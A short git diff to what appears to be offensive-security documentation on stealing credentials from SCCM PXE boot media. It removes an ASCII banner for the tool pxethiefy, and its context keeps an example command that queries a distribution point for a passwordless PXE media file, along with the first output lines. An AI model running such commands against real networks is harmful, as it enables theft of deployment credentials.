@@ -58,18 +58,6 @@ With these credentials, attackers may transition from an unauthenticated context
 - Using pxethiefy from a Linux machine with network access to retrieve a PXE media file with no password set
 ```
 testsubject4@sphere4:~$ sudo python3 pxethiefy.py explore -i eth0 -a atlas.aperture.local
- 
- ________  ___    ___ _______  _________  ___  ___  ___  _______   ________ ___    ___ 
-|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\\  \  /  /|
-\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/\ \  \/  / /
- \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\\ \    / / 
-  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_| \/  /  /  
-   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\__/  / /    
-    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|\___/ /     
-          |__|/ \|__|                                                     \|___|/      
-                                                                                       v.0.0.2
-                                                Based on the original PXEThief by MWR-CyberSec
-                                                     https://github.com/MWR-CyberSec/PXEThief/
 
 [*] Querying Distribution Point: atlas.aperture.local
 [*] Sending DHCP request to fetch PXE boot files at: atlas.aperture.local
